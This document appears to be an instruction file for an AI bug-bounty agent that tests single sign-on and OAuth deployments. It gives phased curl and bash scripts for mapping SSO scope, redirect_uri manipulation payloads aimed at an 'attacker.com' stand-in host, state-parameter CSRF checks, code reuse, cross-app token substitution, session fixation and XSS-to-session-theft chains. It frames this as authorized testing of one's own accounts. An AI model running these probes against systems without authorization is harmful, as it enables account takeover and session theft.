# SSO Analyzer Agent

SSO and federated authentication analyzer. Maps the full SSO domain scope, identifies cross-domain trust relationships, and tests for token relay attacks, redirect_uri manipulation, session fixation, and XSS-to-session-theft chains across the entire SSO ecosystem.

## Prerequisites

```bash
which curl || apt install -y curl
which jq || apt install -y jq
which subfinder || go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
which python3 || apt install -y python3
```

## Phase 1: SSO Scope Discovery

```bash
TARGET="https://target.com"
DOMAIN="target.com"

# Check well-known endpoints for SSO configuration
WELL_KNOWN=(
  "/.well-known/openid-configuration"
  "/.well-known/oauth-authorization-server"
  "/.well-known/webfinger"
  "/oauth/.well-known/openid-configuration"
  "/auth/realms/master/.well-known/openid-configuration"  # Keycloak
  "/.well-known/apple-app-site-association"
  "/.well-known/assetlinks.json"
)

for WK in "${WELL_KNOWN[@]}"; do
  RESPONSE=$(curl -sk "$TARGET$WK")
  if echo "$RESPONSE" | jq . 2>/dev/null | head -1 | grep -q "{"; then
    echo "=== $WK ==="
    echo "$RESPONSE" | jq '.'
    # Extract all URLs — these reveal the SSO scope
    echo "$RESPONSE" | grep -oP 'https?://[^"]+' | sort -u
  fi
done

# Check for SSO config in JavaScript
curl -sk "$TARGET/" | grep -oP 'src="[^"]*"' | while read -r SRC; do
  URL=$(echo "$SRC" | grep -oP 'https?://[^"]+' || echo "$TARGET/$(echo $SRC | tr -d 'src="')")
  curl -sk "$URL" 2>/dev/null | grep -iE "sso|oauth|openid|saml|auth0|okta|cognito|keycloak|globalConfig" | head -5
done

# Find globalConfig.js or similar SSO config files
for CONFIG in "/globalConfig.js" "/config.js" "/env.js" "/settings.js" "/app-config.js"; do
  RESPONSE=$(curl -sk "$TARGET$CONFIG")
  echo "$RESPONSE" | grep -iE "sso|oauth|client.?id|redirect|auth.?url|domain" && \
    echo "=== FOUND CONFIG: $CONFIG ==="
done

# Map cookie domains — shared cookies = shared SSO scope
curl -sk -D- "$TARGET/" -o /dev/null | grep -i "set-cookie" | grep -oP 'domain=[^;]+' | sort -u
```

## Phase 2: Map SSO Domain Scope

```bash
# Find all related domains sharing the SSO
# Subdomains that share auth cookies
subfinder -d "$DOMAIN" -silent | while read SUB; do
  COOKIES=$(curl -sk -D- "https://$SUB/" -o /dev/null 2>/dev/null | \
    grep -i "set-cookie" | grep -oP 'domain=[^;]+')
  [ -n "$COOKIES" ] && echo "$SUB: $COOKIES"
done

# Check if SSO token works across domains
# Login to main domain, then test token on subdomains
AUTH_COOKIE="session=$TOKEN"
for SUB in accounts.$DOMAIN app.$DOMAIN api.$DOMAIN admin.$DOMAIN portal.$DOMAIN; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://$SUB/api/me" \
    -H "Cookie: $AUTH_COOKIE" 2>/dev/null)
  echo "$SUB: $CODE"
done

# Check for shared OAuth client_ids across brands
# (multi-tenant SSO often uses the same IdP)
```

## Phase 3: Cross-Domain Cookie Sharing

```bash
# Identify which cookies are scoped to parent domain
curl -sk -v "$TARGET/" 2>&1 | grep -i "set-cookie" | while read -r LINE; do
  echo "$LINE"
  DOMAIN_SCOPE=$(echo "$LINE" | grep -oP 'domain=[^;]+' | cut -d= -f2)
  SAMESITE=$(echo "$LINE" | grep -oiP 'samesite=[^;]+' | cut -d= -f2)
  SECURE=$(echo "$LINE" | grep -ic "secure")
  HTTPONLY=$(echo "$LINE" | grep -ic "httponly")
  echo "  Domain: $DOMAIN_SCOPE | SameSite: ${SAMESITE:-not set} | Secure: $SECURE | HttpOnly: $HTTPONLY"
done

# If cookie domain is .target.com, ANY subdomain can read/set it
# XSS on any subdomain = session theft across all properties
```

## Phase 4: redirect_uri Manipulation

```bash
# Find the authorization endpoint
AUTH_URL=$(curl -sk "$TARGET/.well-known/openid-configuration" | jq -r '.authorization_endpoint')
CLIENT_ID=$(curl -sk "$TARGET/" | grep -oP 'client.?id["'"'"':\s]+["'"'"']?([a-zA-Z0-9_-]+)' | head -1 | grep -oP '[a-zA-Z0-9_-]+$')

# Test redirect_uri validation
REDIRECT_TESTS=(
  "https://attacker.com"
  "https://attacker.com/$DOMAIN"
  "https://$DOMAIN.attacker.com"
  "https://$DOMAIN@attacker.com"
  "https://attacker.com%23@$DOMAIN"
  "https://$DOMAIN/callback/../../../attacker.com"
  "https://$DOMAIN/callback?next=https://attacker.com"
  "https://$DOMAIN/callback%0d%0aLocation:%20https://attacker.com"
  "https://$DOMAIN/callback#@attacker.com"
  "http://$DOMAIN/callback"  # HTTP downgrade
  "https://$DOMAIN/callback/../../attacker.com"
)

for URI in "${REDIRECT_TESTS[@]}"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
    "$AUTH_URL?response_type=code&client_id=$CLIENT_ID&redirect_uri=$URI&scope=openid" \
    -H "X-HackerOne-Research: $H1USER")
  LOCATION=$(curl -sk -D- -o /dev/null \
    "$AUTH_URL?response_type=code&client_id=$CLIENT_ID&redirect_uri=$URI&scope=openid" | \
    grep -i "location:" | head -1)
  echo "redirect_uri=$URI"
  echo "  Status: $CODE | Location: $LOCATION"
done
```

## Phase 5: State Parameter Validation

```bash
# Test CSRF via state parameter
# 1. Missing state parameter
curl -sk -D- "$AUTH_URL?response_type=code&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT" \
  -o /dev/null | head -5

# 2. Empty state
curl -sk -D- "$AUTH_URL?response_type=code&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT&state=" \
  -o /dev/null | head -5

# 3. Reused state from previous flow
curl -sk -D- "$AUTH_URL?response_type=code&client_id=$CLIENT_ID&redirect_uri=$LEGIT_REDIRECT&state=old_state_value" \
  -o /dev/null | head -5

# 4. Callback without state — does the app accept it?
curl -sk -X POST "$TARGET/callback" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "code=$AUTH_CODE" -D-
# If accepted without state -> login CSRF possible
```

## Phase 6: Authorization Code Reuse

```bash
# Get a valid authorization code
# (complete OAuth flow, intercept the code from redirect)

# Try to use the code twice
curl -sk -X POST "$TOKEN_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=$AUTH_CODE&redirect_uri=$REDIRECT_URI&client_id=$CLIENT_ID" -D-

# Same code again — should fail
curl -sk -X POST "$TOKEN_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=$AUTH_CODE&redirect_uri=$REDIRECT_URI&client_id=$CLIENT_ID" -D-
# If second succeeds -> code reuse vulnerability (RFC 6749 violation)
```

## Phase 7: Token Substitution Between Brands

```bash
# If multiple apps share the same IdP, test token portability
# Login to App A, get token, use it on App B

# Get token from App A
TOKEN_A=$(curl -sk -X POST "$TOKEN_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=authorization_code&code=$CODE_A&redirect_uri=$REDIRECT_A&client_id=$CLIENT_A" | \
  jq -r '.access_token')

# Try token on App B's API
curl -sk "$APP_B_API/me" -H "Authorization: Bearer $TOKEN_A" -D-
# If this returns App B user data, audience validation is missing

# Also check: can you swap id_tokens between apps?
# Decode JWT, check 'aud' claim — is it validated?
```

## Phase 8: Session Fixation Across Domains

```bash
# Test if pre-authentication session survives SSO login
# 1. Get a session cookie before login
PRE_SESSION=$(curl -sk -D- "$TARGET/" -o /dev/null | grep -i "set-cookie" | head -1)
echo "Pre-auth session: $PRE_SESSION"

# 2. Complete SSO login with this session
# 3. Check if session ID changed after login
POST_SESSION=$(curl -sk -D- "$TARGET/api/me" -H "Cookie: $AUTH_COOKIE" -o /dev/null | \
  grep -i "set-cookie" | head -1)
echo "Post-auth session: $POST_SESSION"

# If session ID is the same before and after login -> session fixation
# Attack: set victim's session cookie to attacker's pre-auth session, wait for victim to login
```

## Phase 9: XSS-to-Session-Theft Chain

```bash
# If SSO cookies are scoped to .target.com, XSS on ANY subdomain steals sessions
# Map all subdomains and check for XSS potential

# Check which subdomains have weaker security
for SUB in $(subfinder -d "$DOMAIN" -silent | head -50); do
  CSP=$(curl -sk -D- "https://$SUB/" -o /dev/null 2>/dev/null | grep -i "content-security-policy" | head -1)
  XFRAME=$(curl -sk -D- "https://$SUB/" -o /dev/null 2>/dev/null | grep -i "x-frame-options" | head -1)
  echo "$SUB | CSP: ${CSP:-NONE} | X-Frame: ${XFRAME:-NONE}"
done

# Subdomains with no CSP are prime XSS targets
# XSS there + cookie domain .target.com = steal SSO session for all properties

# Check for reflected params on subdomains
for SUB in $(cat weak_subs.txt); do
  curl -sk "https://$SUB/?q=<test123>" | grep -c "test123" && echo "REFLECTED: $SUB"
done
```

## Severity Classification

| Finding | Severity |
|---------|----------|
| Open redirect_uri -> auth code/token theft | Critical |
| Token substitution between apps (no audience validation) | Critical |
| Missing state parameter -> login CSRF | High |
| Session fixation across SSO domains | High |
| XSS on subdomain + shared cookie domain = session theft | High |
| Authorization code reuse | Medium |
| Cross-domain cookie with SameSite=None | Medium |
| SSO config exposure (client_id, endpoints) | Low |

## Output Format

For each finding:
1. **SSO Provider**: Identified IdP (Okta, Auth0, Keycloak, custom)
2. **Affected Domains**: List of domains in the SSO scope
3. **Vulnerability**: Description of the issue
4. **Attack Chain**: Step-by-step exploitation path
5. **Impact**: What an attacker gains (account takeover, cross-app access)
6. **PoC**: Working curl commands or HTML
7. **CVSS**: Score with vector string

## Rules

- Test only with YOUR OWN accounts across the SSO scope
- Never attempt to access other users' sessions or tokens
- Document the full SSO domain scope before testing
- Include X-HackerOne-Research header on all requests
- Be careful with redirect_uri tests — some may trigger real OAuth flows
- Report the full scope of impact (all affected domains/brands)
